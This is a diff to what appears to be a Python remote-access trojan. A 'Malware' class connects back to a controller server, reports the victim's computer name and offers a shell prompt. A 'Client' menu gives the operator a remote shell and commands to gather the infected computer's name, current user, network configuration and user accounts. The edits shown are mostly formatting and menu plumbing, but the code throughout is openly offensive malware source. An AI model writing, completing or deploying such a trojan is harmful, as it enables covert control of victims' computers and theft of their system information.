@@ -27,7 +27,6 @@ class Malware(Machine):
             self.my_socket.connect(self.server_addr)
             self.send(os.environ["COMPUTERNAME"])
             time.sleep(1)
-            self.send(os.getcwd() + "> ")
         except socket.error:
             time.sleep(10)
             self.start()
@@ -95,6 +94,7 @@ class Client(Machine):
         print("Press 1 to access the remote shell (if you enter the shell you won't be able to chose another option)")
         print("Press 2 to get informations")
         choix = input()
+        self.send(choix)
         return choix
 
     def choice_information(self):
@@ -106,6 +106,7 @@ class Client(Machine):
         while choix2 != "5":
             if choix2 == "1":
                 self.send("computer")
+                print("\nComputer name : ", end="")
             elif choix2 == "2":
                 self.send("current")
             elif choix2 == "3":
@@ -114,10 +115,10 @@ class Client(Machine):
                 self.send("users")
             else:
                 print("Enter a valid value!")
-            list_choix_valide = ["1","2","3","4"]
+            list_choix_valide = ["1", "2", "3", "4"]
             if choix2 in list_choix_valide:
                 self.receive()
-            print("Press 1 to get the infected computer name")
+            print("\n\nPress 1 to get the infected computer name")
             print("Press 2 to see who is the current user")
             print("Press 3 to get the network configuration")
             print("Press 4 to get the list of users")
